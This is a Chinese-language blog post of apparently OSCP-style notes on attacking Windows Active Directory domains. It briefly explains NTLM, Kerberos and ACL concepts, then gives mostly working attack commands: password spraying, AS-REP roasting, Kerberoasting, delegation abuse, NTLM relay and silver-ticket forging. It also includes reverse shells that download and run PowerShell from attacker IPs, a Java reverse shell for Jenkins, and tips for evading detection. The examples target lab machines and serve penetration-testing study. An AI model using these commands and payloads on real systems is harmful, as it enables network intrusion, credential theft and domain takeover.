\"//parameter[@name='forest-login-domain']\" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}} $username = select-xml -Content $config -XPath \"//parameter[@name='forest-login-user']\" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}} $password = select-xml -Content $decrypted -XPath \"//attribute\" | select @{Name ='Password'; Expression = {$_.node.InnerXML}} Write-Host (\"Domain: \" + $domain.Domain) Write-Host (\"Username: \" + $username.Username) Write-Host (\"Password: \" + $password.Password) } powerview脚本 下载： https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 bypass powershell -ep bypass 导入： . .\\PowerView.ps1 修改账户密码： $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force Set-DomainUserPassword -Identity SMITH（用户名）-AccountPassword $UserPassword -Credential $Cred 常规用法： 查看域内信息： Get-NetDomain 查看用户信息： Get-NetUser Get-NetUser | select cn 查看组： Get-NetGroup | select cn 查看组成员 Get-NetGroup \"Sales Department\" | select member 查看主机信息： Get-NetComputer ！！！！！！！！！！！ 查看当前用户可以以管理员登录哪台计算机： Find-LocalAdminAccess 查看目标计算机登录的用户： Get-NetSession -ComputerName files04 -Verbose 枚举域共享： Find-DomainShare 票据常规操作 摧毁票据： kdestroy 导入票据： export KRB5CCNAME=administrator.ccache net rpc kerberos协议添加用户进组： net rpc group addmem \"NETWORK AUDIT\" \"m.lovegod\" -U \"absolute.htb\"/\"m.lovegod\" -S \"DC.absolute.htb\" --use-kerberos=required 修改密码，以hash的方式 net rpc password \"Tristan.Davies\" \"newP@ssword2023\" -U \"search.htb\"/\"BIR-ADFS-GMSA$\" -S \"RESEARCH.search.htb\" --pw-nt-hash Nishang 一个涵盖几乎所有渗透测试流程的脚本：\nhttps://github.com/samratashok/nishang/tree/master 一个简单介绍： 有点骚东西： https://www.bilibili.com/read/cv19365761/\n反弹shell：\n下载https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 在最后面，添加： Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 4444 开启http服务： 远程调用执行： 1、powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.223:8000/nishang.ps1')\" 2、powershell iex(new-object net.webclient).downloadstring(\\\"http://10.10.16.5/Invoke-PowerShellTcp.ps1\\\") 3、IEX (New-Object System.Net.Webclient).DownloadString(\"http://192.168.119.3/powercat.ps1\");powercat -c 192.168.119.3 -p 4444 -e powershell 躲避检测： 修改文件名字为tcp.ps1 sed -i \"s/PowerShellTcp/tcpps/g\" tcp.ps1 Jenkins: windows: def proc = \"powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.3/nishang.ps1')\".execute(); def os = new StringBuffer(); proc.waitForProcessOutput(os, System.err); println(os.toString()); Linux： String host=\"83.229.122.49\"; int port=8888; String cmd=\"/bin/sh\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u003e0)so.write(pi.read());while(pe.available()\u003e0)so.write(pe.read());while(si.available()\u003e0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); 正向shell：\n和上一步的却别在于，修改最后一行为： Invoke-PowerShellTcp -Bind -Port 1521 然后正向去连接： nc -nv 10.10.10.125 1521 PowerShell Empire 该工具作为msf禁用情况下的代替工具，核心还是代替EXE，存疑，建议别用\n开启服务： sudo powershell-empire server 启动客户端： sudo powershell-empire client 进入监听： listeners uselistener http 使用options查看设置详情： 设置监听详情： set Name yesir set Host 10.10.16.5 set Port 1336 execute 输入help查看帮助： 生成木马： usestager windows_reverseshell set Listener yesir set LocalHost 10.10.16.5 set LocalPort 1336 execute 查看会话： agents 进入会话： interact 会话名 退出会话： back targetedKerberoast https://github.com/ShutdownRepo/targetedKerberoast CrackMapExec 该工具的使用极为强大： 简介： https://mp.weixin.qq.com/s/G1PC_C3fhE-OGIbnBFRNQQ\ngithub: https://github.com/byt3bl33d3r/CrackMapExec\nsmb 192.168.216.144 -u 'administrator' -p 'pass1234!' -x 'whoami' 持续爆破\n--continue-on-success 目前我感兴趣的地方：\n1、smb 枚举东西较多，如共享、杀软、域用户、密码策略、验证登录 2、dump hash，有高权限账号的话 3、导出ntds域内数据库 4、通过smb文件上传、下载 5、枚举打印机、webdav服务等 6、AS-REP Roast，在有用户名的前提下还可以再次枚举 7、ESC8 查找 8、ms17-010、zerologo（CVE-2020-1472）、petitpotam、nopac（CVE-2021-42278 and CVE-2021-42287）漏洞 域内权限的利用特点记录： owns权限记得先修改所属人，在进行下一步 影子凭证 Certipy工具 github.com/ly4k/Certipy 使用方式： https://cloud.tencent.com/developer/article/1946138 PsLoggedon 工具 查看主机登录账户： .\\PsLoggedon.exe \\\\web04 ","wordCount":"1302","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">域渗透操作</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1302 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#一ntlm协议>一、NTLM协议</a><ul><li><a href=#1lm-hash算法>1、LM hash算法</a></li><li><a href=#2ntlm-hash算法>2、NTLM hash算法</a></li><li><a href=#3ntlm-协议认证>3、NTLM 协议认证</a></li><li><a href=#4攻击方式>4、攻击方式</a></li></ul></li><li><a href=#二kerberos协议>二、Kerberos协议</a></li><li><a href=#1基础>1、基础</a></li><li><a href=#2pac>2、PAC</a></li><li><a href=#3认证流程>3、认证流程</a></li><li><a href=#4攻击方式-1>4、攻击方式</a><ul><li><a href=#密码喷洒>密码喷洒：</a></li><li><a href=#as-rep-roasting>AS-REP Roasting</a></li><li><a href=#kerberoasting>Kerberoasting</a></li></ul></li><li><a href=#三ldap协议>三、LDAP协议</a></li><li><a href=#四组策略>四、组策略</a></li><li><a href=#五acl-访问控制列表>五、ACL 访问控制列表</a></li></ul><ul><li><a href=#1域内用户枚举>1、域内用户枚举</a></li><li><a href=#2密码喷洒>2、密码喷洒</a></li><li><a href=#3as-rep-roasting>3、AS-REP Roasting</a></li><li><a href=#4kerberoasting>4、kerberoasting</a></li><li><a href=#5委派>5、委派</a><ul><li></li></ul></li><li><a href=#6dcsync>6、DCSYNC</a></li><li><a href=#7pth>7、PTH</a></li><li><a href=#8域内漏洞>8、域内漏洞</a></li><li><a href=#certifygit>Certify.git</a><ul><li></li></ul></li><li><a href=#9中继>9、中继</a></li><li><a href=#10白银票据>10、白银票据</a></li><li><a href=#几个横向工具>几个横向工具</a><ul><li></li></ul></li><li><a href=#bloodhound>Bloodhound</a><ul><li></li></ul></li><li><a href=#impacket工具包>Impacket工具包：</a></li><li><a href=#mimikatz>mimikatz</a></li><li><a href=#主机密码获取>主机密码获取</a><ul><li><a href=#readlapspassword>ReadLAPSPassword</a></li><li><a href=#writeowner-权限>writeowner 权限：</a></li></ul></li><li><a href=#ad-recycle-bin组>AD Recycle Bin组</a></li><li><a href=#添加dns记录>添加dns记录</a></li><li><a href=#readgmsapassword权限>ReadGMSAPassword权限</a></li><li><a href=#readlapspassword-1>ReadLAPSPassword</a></li><li><a href=#azure-ad-aad-sync-service攻击>Azure AD (AAD) Sync service攻击</a></li><li><a href=#powerview脚本>powerview脚本</a></li><li><a href=#票据常规操作>票据常规操作</a></li></ul><ul><li><ul><li><a href=#targetedkerberoast>targetedKerberoast</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=impacket-lookupsid>impacket-lookupsid<a hidden class=anchor aria-hidden=true href=#impacket-lookupsid>#</a></h1><p>可获取主机用户名：</p><pre tabindex=0><code>impacket-lookupsid svc_apache:&#39;S@Ss!K@*t13&#39;@&#39;flight.htb&#39;

筛选用户：
cat u|grep SidTypeUser|awk -F &#39;\&#39; &#39;{ print $2 }&#39;|awk -F &#39; &#39; &#39;{ print $1 }&#39;
</code></pre><h1 id=组合拳winpeassmimikatz信息检索linuxpeass枚举服务暴力破解>组合拳：winpeass+mimikatz+信息检索+linuxpeass+枚举服务+暴力破解<a hidden class=anchor aria-hidden=true href=#组合拳winpeassmimikatz信息检索linuxpeass枚举服务暴力破解>#</a></h1><p>同步ntp时间：</p><pre tabindex=0><code>sudo ntpdate -s 10.10.10.24
</code></pre><p>查看是否在域内：</p><pre tabindex=0><code>net time /do
</code></pre><h2 id=一ntlm协议>一、NTLM协议<a hidden class=anchor aria-hidden=true href=#一ntlm协议>#</a></h2><h3 id=1lm-hash算法>1、LM hash算法<a hidden class=anchor aria-hidden=true href=#1lm-hash算法>#</a></h3><p>简要：采用DES加密，容易被破解，明文长度最长为14，windows vista和windows server 2008后，默认禁用。</p><h3 id=2ntlm-hash算法>2、NTLM hash算法<a hidden class=anchor aria-hidden=true href=#2ntlm-hash算法>#</a></h3><p>简要：为了解决LM hash的问题而引入，使用MD4散列算法，存放在SAM文件中</p><h3 id=3ntlm-协议认证>3、NTLM 协议认证<a hidden class=anchor aria-hidden=true href=#3ntlm-协议认证>#</a></h3><p>简要：基于挑战响应的验证机制，分为Negotiate 协商、challenge 质询、Authentication 认证三步，存在两个版本 V1和V2，目前使用较多的为V2，区别为challenge值和算法不同。</p><p>challenge值：
V1：8B
V2：16B
Net-Ntlm hash:
V1：DES加密算法
V2：HMAC-MD5加密算法</p><h3 id=4攻击方式>4、攻击方式<a hidden class=anchor aria-hidden=true href=#4攻击方式>#</a></h3><p>基于以上特性，NTLM主要有三种攻击方式：
1、PTH，由于整个认证过程中都是使用NTLM hash来进行认证，只需要拿到NTLM hash即可通过135/445进行横向移动。
2、NET-NTLM Relay，发生在response中。
3、Net-NTLM v1 hash 破解，由于设计缺陷，获得hash即可破解，可使用打印机漏洞等方式获取。</p><h2 id=二kerberos协议>二、Kerberos协议<a hidden class=anchor aria-hidden=true href=#二kerberos协议>#</a></h2><h2 id=1基础>1、基础<a hidden class=anchor aria-hidden=true href=#1基础>#</a></h2><p>①客户端
②服务端，拥有唯一的SPN（服务主体名称）
③认证服务的KDC（密钥分发中心），服务账户为krbtgt。</p><p>简要：使用TCP/UDP 88进行认证，TCP/UDP 464进行密码重置，两个基础认证模块：AS_REQ&amp;AS_REP和TGS_REQ&amp;TGS_REP，以及两个扩展模块:S4U（分为S4u2Self和S4u2Proxy）和PAC。</p><h2 id=2pac>2、PAC<a hidden class=anchor aria-hidden=true href=#2pac>#</a></h2><p>简要：微软引入进行权限鉴别的东西，正常的Kerberos流程中，TGT和ST均带有PAC。这部分内容可以伪造，但是具有签名，使用服务端或者KDC密钥进行签名，如果有服务端密钥就可以伪造，但是如果开启了KDC校验，就无法伪造。（白银票据的防御）</p><h2 id=3认证流程>3、认证流程<a hidden class=anchor aria-hidden=true href=#3认证流程>#</a></h2><p><img loading=lazy src=/oscp_img/oscp_img_20240111_172204.jpg alt></p><h2 id=4攻击方式-1>4、攻击方式<a hidden class=anchor aria-hidden=true href=#4攻击方式-1>#</a></h2><h3 id=密码喷洒>密码喷洒：<a hidden class=anchor aria-hidden=true href=#密码喷洒>#</a></h3><p>在AS_REQ请求包中的cname字段，用户名存在与否，密码正确与否，KDC返回内容不一样导致。</p><h3 id=as-rep-roasting>AS-REP Roasting<a hidden class=anchor aria-hidden=true href=#as-rep-roasting>#</a></h3><p>如果没有进行预认证，在AS_REP中返回的内容由用户hash加密，如果能破解成功，那么就可以获取到用户明文密码。</p><h3 id=kerberoasting>Kerberoasting<a hidden class=anchor aria-hidden=true href=#kerberoasting>#</a></h3><p>在TGS-REP阶段中，返回的内容由服务的hash加密，如果能破解成功，那么就可以获取到用户明文密码，理论上可以获取到krbtgt用户的密码，但是这个服务账户的密码是随机的，爆破不出来。</p><h2 id=三ldap协议>三、LDAP协议<a hidden class=anchor aria-hidden=true href=#三ldap协议>#</a></h2><p>简要：树状图，用来标记活动目录中的对象</p><h2 id=四组策略>四、组策略<a hidden class=anchor aria-hidden=true href=#四组策略>#</a></h2><p>简要：一种域内管理手段，简单理解为脚本。GPT是具体的配置模板，通常位于域控的%systemroot%\sysvol\域名、Policies文件夹内，任何用户均可访问，</p><p>攻击方式：
1、组策略首选项，如有批量密码修改的情况，密码采用AES-256加密，但是微软公布了密钥，导致可以解密里面存放的密码。
2、滥用的委派情况，如果委派了某个用户对组策略的修改，可用来造成权限维持。
3、定时任务</p><h2 id=五acl-访问控制列表>五、ACL 访问控制列表<a hidden class=anchor aria-hidden=true href=#五acl-访问控制列表>#</a></h2><p>SP：安全主体，可以通过系统进行身份鉴别的任何实体，例如：用户账户、计算机账户、进程、线程等。
SID：安全标识符，标识安全主体的东西，控制身份鉴别，相关权限的东西。
访问控制模型：
1、访问令牌，包含各种SID，用户的、组的、所有者的等等；
2、安全描述符，创建的安全对象会分配相关的安全信息，包括各种控制信息。</p><h1 id=渗透手法>渗透手法<a hidden class=anchor aria-hidden=true href=#渗透手法>#</a></h1><h2 id=1域内用户枚举>1、域内用户枚举<a hidden class=anchor aria-hidden=true href=#1域内用户枚举>#</a></h2><p>适用场景：</p><p>可在域外进行，无域内用户的场景下进行；</p><p>利用工具：</p><p>kerbrute
pyKerbrute
msf</p><pre tabindex=0><code>../kerbrute_linux_386 userenum --dc 10.10.11.129 -d search.htb user.txt -v
</code></pre><h2 id=2密码喷洒>2、密码喷洒<a hidden class=anchor aria-hidden=true href=#2密码喷洒>#</a></h2><p>适用场景：</p><p>可在域外进行，但是要注意密码策略，如果有域内用户，可通过Adinfo_darwin查询域内账户策略，防止被封。</p><p><strong>(如果有账户，可以查询域内的其他用户进行喷洒，如果没有，就要配合枚举进行强行喷洒)</strong></p><p>利用工具：</p><p>kerbrute</p><pre tabindex=0><code>../kerbrute_linux_amd64 passwordspray --dc 10.10.10.248 -d intelligence.htb /usr/share/wordlists/john.lst &#39;NewIntelligenceCorpUser9876&#39;
</code></pre><p>pyKerbrute
DomainPassword Spray.ps1</p><pre tabindex=0><code>https://github.com/dafthack/DomainPasswordSpray
powershell -exec bypass
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 密码
</code></pre><p>.\Rubeus.exe brute /passwords:&lt;passwords_file> /outfile:&lt;output_file></p><p>小技巧：</p><p>通过crackmapexec来获取密码策略，2016下</p><pre tabindex=0><code>crackmapexec smb ip --pass-pol -u &#39;&#39; -p &#39;&#39;

或者域内主机：
net accounts
</code></pre><h2 id=3as-rep-roasting>3、AS-REP Roasting<a hidden class=anchor aria-hidden=true href=#3as-rep-roasting>#</a></h2><p>适用场景：</p><p>目标用户账户设置不进行预身份验证，但是该选项默认不开启，也就是说这个攻击默认配置是无法进行的。同时需要在域内主机或者拥有域内用户账户的情况下进行。</p><p><strong>(有用户名，可以在域外直接打)</strong></p><p>利用工具：</p><p>Rubeus （自动搜索可攻击的账户，并保存为john可爆破的格式，在域内主机上执行）
ASREPRoast.ps1 (域内主机执行，自动搜索可攻击的账户，需要使用select进行筛选，john可爆破格式)
Adfind+impacket GetNPUsers.py(可在域外执行，但是得有可用用户密码，使用Adfind筛选账户，使用GetNPUsers.py获取hash)</p><pre tabindex=0><code>一、域外打法：
获取账户：
① 匿名LDAP登录使用：
ldapsearch -x -H ldap://10.10.10.161:389 -u &#39;&#39; -w &#39;&#39; -b &#34;DC=htb,DC=local&#34; &#34;(&amp;(objectCategory=person)(objectClass=user))&#34; |grep dn
筛选AWK语句：

②有身份信息使用adfinder:(方便很多)
或者cme

获取john hash
python ../impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -usersfile username.txt -format john htb.local/

有身份信息：
GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete

破解
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

二、域内打法：
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
Rubeus 梭哈，自动化



https://github.com/HarmJ0y/ASREPRoast

ASREPRoast.ps1 梭哈，自动化

Import-Module .\ASREPRoast.ps1
Invoke-ASREPRoast 
</code></pre><h2 id=4kerberoasting>4、kerberoasting<a hidden class=anchor aria-hidden=true href=#4kerberoasting>#</a></h2><p>适用场景：<strong>（有一个普通权限就可以尝试）</strong></p><p>1、拥有一个合法用户密码；2、域内有注册于域用户下的SPN</p><p>利用方法：</p><p>1、获取滥用的SPN：</p><p>RiskySPN：域内主机，该工具可自动过滤出可用的SPN
GetUSerSPNS：域内主机，该工具会列出所有注册于用户名下的SPN
powerview.ps1：域内主机，该工具会列出所有注册于用户名下的SPN</p><p>2、请求服务票据：</p><p>impacket GetuserSPNs.py：域外主机，使用账号密码，该工具可以跳过第一步，输出内容为hashcat可爆破内容。</p><p>Rubeus：域内主机，该工具可以跳过第一步，输出内容为hashcat或者john可爆破内容.
mimikatz：域内主机，挨个请求，保存在内存中</p><p>3、使用上述工具输出的内容破解，或者使用mimikatz、empire导出票据破解</p><p>4、破解工具
kerberoast：可用于破解mimikatz导出的.kirbi格式的票据爆破
tgscrack：.kirbi格式转换后破解
hashcat：破解</p><p>操作</p><pre tabindex=0><code>域外主机，有账密打域内：

获取滥用的SPN：
python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18

获取ST，保存为hashcat能爆破的格式：
python /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt

爆破：
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force

域内主机：

1、
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.asreproast


2、
https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1

iex(new-object net.webclient).downloadString(&#39;http://192.168.49.211:80/Invoke-Kerberoast.ps1&#39;); Invoke-Kerberoast -OutputFormat Hashcat

hashcat -m 13100 --force -a 0 svc_mssql.kerberoast /usr/share/wordlists/rockyou.txt
</code></pre><h2 id=5委派>5、委派<a hidden class=anchor aria-hidden=true href=#5委派>#</a></h2><h4 id=非约束性委派打法>非约束性委派打法：<a hidden class=anchor aria-hidden=true href=#非约束性委派打法>#</a></h4><p>**场景：<strong>拿到具有委派的服务账户</strong>（bloodhound可查）</p><p>相关主机账户和服务账户：userAccountControl 会包含 TRUSTED_FOR_DELEGATION 字段，域控默认非约束性委派。</p><p>使用mimikatz抓取即可，TGT，访问目标什么权限，就可以获得什么权限。</p><p>非约束委派在实战遇到较少，一般都是打印机强制认证，利用也不稳定。</p><p>需要非约束委派主机控制权</p><h4 id=约束委派打法>约束委派打法：<a hidden class=anchor aria-hidden=true href=#约束委派打法>#</a></h4><p>**场景：拿到具有委派的服务账户（bloodhound可查）</p><p>主机账号或者服务账号被设置为约束委派时， userAccountControl 会包含RUSTED_TO_AUTHENTICATE_FOR_DELEGATION 字段，有msDS-AllowedToDelegateTo字段，里面包含了允许委派的服务</p><p>利用条件为：
1、知道设置约束性委派的用户名和密码（或者Hash） （通常为当前立足点）
2、知道设置约束性委派设置的委派目标的SPN （通常为横向目标主机）</p><p>就可以获取到委派目标的权限，通常为管理员。</p><p>利用方式：</p><pre tabindex=0><code>hash方式：
python ../impacket/examples/getST.py -dc-ip 10.10.10.248 （域名/机器账户，不用加$）intelligence.htb/svc_int -hashes :e0dcda8d93bf71a6352ea7803c8f17f1 -spn (可以为委派的spn)www/DC.intelligence.htb -impersonate &#39;administrator&#39;

账密：
python ../impacket/examples/getST.py -dc-ip 10.10.10.248 （域名/机器账户，不用加$）intelligence.htb/svc_int：password -spn (可以为委派的spn)www/DC.intelligence.htb -impersonate &#39;administrator&#39;
</code></pre><h4 id=基于资源的约束委派打法>基于资源的约束委派打法<a hidden class=anchor aria-hidden=true href=#基于资源的约束委派打法>#</a></h4><p>**场景：拿到具有委派的服务账户（bloodhound可查，不一定明说，DC的完全控制权可以，可看hacktricks）</p><p>当拿到的主机具备以下权限时可以考虑：</p><p>默认情况下以下账户拥有修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的权限：<br>Domain Admins(域管理员)<br>mS-DS-CreatorSID(将该机器加入域的账户)<br>NT AUTHORITY\SELF(机器账户本身）</p><p>在假设获取到了域内普通用户的情况下：</p><p>攻击步骤：</p><p>1、查看当前用户对应的域内机器；
2、创建机器用户；
3、由于当前用户对加入域内的主机拥有配置基于RBCD的权限，所以配置RBCD；
4、使用新建的机器账 户，就可以获取到目标域内机器的最高权限。</p><p>域内主机，域外参考sxf域渗透打法：</p><pre tabindex=0><code>一、导入模块：
Import-Module ./Powermad.ps1
或者
. ./Powermad.ps1
二、添加机器账户，基于资源的约束型委派需要：
Set-Variable -Name &#34;FakePC&#34; -Value &#34;FAKE01&#34;  # FAKE01这个名字可以自己改
Set-Variable -Name &#34;targetComputer&#34; -Value &#34;DC&#34;
New-MachineAccount -MachineAccount (Get-Variable -Name &#34;FakePC&#34;).Value -Password $(ConvertTo-SecureString &#39;123456&#39; -AsPlainText -Force) -Verbose
三、设置权限
Set-ADComputer (Get-Variable -Name &#34;targetComputer&#34;).Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name &#34;FakePC&#34;).Value + &#39;$&#39;)
四、生成hash
./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
五、利用hash申请票据
添加hosts文件
echo &#34;10.10.11.174 support.htb&#34; &gt;&gt; /etc/hosts
echo &#34;10.10.11.174 dc.support.htb&#34; &gt;&gt; /etc/hosts
生成TGT票据，以administrator的身份申请一张访问http/dc.support.htb服务的票据
python3 getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
六、连接
添加票据，如果失败，添加dns解析
export KRB5CCNAME=administrator.ccache
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k



方法二：
impacket-addcomputer -computer-name &#34;machine19&#34; -computer-pass &#34;P@ssw0rd&#34; -dc-ip 192.168.180.175 -method SAMR -debug resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808

impacket-rbcd -delegate-from machine19$ -delegate-to RESOURCEDC$ -dc-ip 192.168.180.175 -action write resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808

impacket-getST resourced.local/&#39;machine18$&#39;:&#39;P@ssw0rd&#39; -spn cifs/RESOURCEDC.resourced.local -impersonate administrator

后面第六步一样
</code></pre><p>总结条件：
1、攻击者拥有(将该机器加入域的账户、机器本身、管理员）身份之一，多数为前两者。
2、存在相关主机（也就是横向 or 提权目标）</p><p>应用场景为：提权、有其他主机被当前用户拉入域内的横向移动。</p><h4 id=kerberos-bronze-bit打委派的时候记得尝试>kerberos Bronze Bit（打委派的时候记得尝试）<a hidden class=anchor aria-hidden=true href=#kerberos-bronze-bit打委派的时候记得尝试>#</a></h4><p>这个漏洞可以绕过不允许委派的敏感账户进行委派，getst.py后加上-force-forwardable参数即可</p><h2 id=6dcsync>6、DCSYNC<a hidden class=anchor aria-hidden=true href=#6dcsync>#</a></h2><p>利用域控的复制，获取所有账号密码</p><h2 id=7pth>7、PTH<a hidden class=anchor aria-hidden=true href=#7pth>#</a></h2><p>PTH存在限制，默认情况下，由于UAC的存在，只有本地管理员和域管理员组用户可以直接PTH。</p><h2 id=8域内漏洞>8、域内漏洞<a hidden class=anchor aria-hidden=true href=#8域内漏洞>#</a></h2><p>1、MS14-068</p><p>梭哈，域内普通用户主机直接打域控</p><pre tabindex=0><code>方案一：impacket

apt-get install krb5-user -y

python ../impacket/examples/goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 htb.local/james:&#39;J@m3s_P@ssW0rd!&#39;@MANTIS.htb.local

报错解决方案
https://note.f5.pm/go-37050.html



方案二：
Metasploit

方案三：
PyKEK 工具包 
当前kali环境没成功过
</code></pre><p>2、zerologon</p><p>梭哈，域外直接打域控，走135端口</p><p>3、windows print spooler</p><p>域内普通用户，上线CS</p><p>4、ADCS 证书攻击</p><p>2021年进入人们视野，在域中可以使用证书进行身份认证，身份鉴别在于私钥，拥有私钥甚至可以用作权限维持，总是可以获取到最新的NTLM hash。</p><p>但是不是所有的证书都可以用来进行身份认证，只有部分配置了特殊权限的证书可以。</p><h2 id=certifygit>Certify.git<a hidden class=anchor aria-hidden=true href=#certifygit>#</a></h2><p><a href=https://github.com/ademkanat/Certify.git>https://github.com/ademkanat/Certify.git</a></p><h5 id=cve-2022-26923>CVE-2022-26923<a hidden class=anchor aria-hidden=true href=#cve-2022-26923>#</a></h5><p>该漏洞便是因为机器账户，可以申请域控的证书，导致的普通用户提权到域管。</p><p>certipy攻击</p><h5 id=cve-2021-42287>CVE-2021-42287<a hidden class=anchor aria-hidden=true href=#cve-2021-42287>#</a></h5><p>该漏洞和上述漏洞较为相似，但是攻击链更为复杂，同样是需要一个有效用户。</p><p>可梭哈</p><p>错误的ADCS模板配置：</p><h5 id=exchange>Exchange<a hidden class=anchor aria-hidden=true href=#exchange>#</a></h5><p>两条攻击链，均可梭哈</p><h2 id=9中继>9、中继<a hidden class=anchor aria-hidden=true href=#9中继>#</a></h2><p>这种方式其实叫做认证：</p><pre tabindex=0><code>sudo responder -i 10.10.16.3 -I tun0

抓到的hash需要破解，装进txt，使用john --wordlist=xxx hash.txt
或者：hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
</code></pre><p>中继：
ntlmrelayx</p><pre tabindex=0><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c &#34;powershell -enc JABjAGwAaQBlAG4AdA...&#34;
</code></pre><p>dir \192.168.45.168\test</p><h2 id=10白银票据>10、白银票据<a hidden class=anchor aria-hidden=true href=#10白银票据>#</a></h2><p>特殊情况下获得服务的密码以及sid和spn，可以尝试：</p><pre tabindex=0><code>ntlm hash生成网站：
https://www.browserling.com/tools/ntlm-hash

需要：sid\spn:

python ../impacket/examples/ticketer.py -domain-sid S-1-5-21-2743207045-1827831105-2542523200-502 -spn MSSQLSvc/dc1.scrm.local -nthash B999A16500B87D17EC7F2E2A68778F05 -domain scrm.local administrator


mimikatz:

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
